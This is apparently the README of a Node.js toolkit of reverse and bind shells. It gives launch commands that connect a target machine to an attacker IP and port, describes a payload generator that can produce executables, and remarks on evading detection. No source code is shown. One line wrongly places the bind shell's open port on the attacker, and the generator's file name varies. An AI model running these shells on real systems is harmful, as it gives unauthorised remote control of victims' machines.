# Shell.js

Shell.js includes complete TCP bind and reverse shells written entirely in Node.js!

## Reverse Shell

The reverse shell is created through `reverse.js` and `reverse_listener.js`.

`reverse.js` is run on the target machine with the format `node reverse.js <attacker IP> <port>`.

`reverse_listener.js` is run on the attacker machine with the format `node reverse_listener.js <port>`.

A reverse shell connects from the target to the attacker through a TCP connection, relaying output from the shell through the TCP socket and relaying incoming data in the socket to the shell input. This is the most common and less detectable than bind shells, which open ports on the attacker that can be easily identified as suspicious.

## Bind Shell

The bind shell is created through `bind.js` and `bind_listener.js`.

`bind.js` is run on the target machine with the format `node bind.js <port>`.

`bind_listener.js` is run on the attacker machine with the format `node bind_listener.js <attacker IP> <port>`.

A bind shell, unlike a reverse shell, connects from the attacker to the target, which then receives the TCP connection and begins relaying a shell through the socket. This runs some risks, including increased risk of detection with a socket being opened on the target and the ability of other attackers to connect to the machine with a simple TCP connection.

## Shell Generator

`generate.js` allows you to generate static shell payloads! If you are unable to run the shell with command-line arguments, this can allow you to directly add the port and host to the required launcher and listener so you can simply run the JavaScript files, or even compile them to executables!

The shell generator is run as `node generator.js <reverse/bind> <attacker IP> <port> <output file (optional)>`. However, unlike the other scripts, this is not stand-alone and requires the other files to be present in the directory, as it reads these files to modify them and generate the new payloads. Additionally, the output file argument is not required, and the default is `generated_shell`, which will produce the files `generated_shell.js` and `generated_shell_launcher.js`. The file name should not include the `.js` to allow both files to be created.
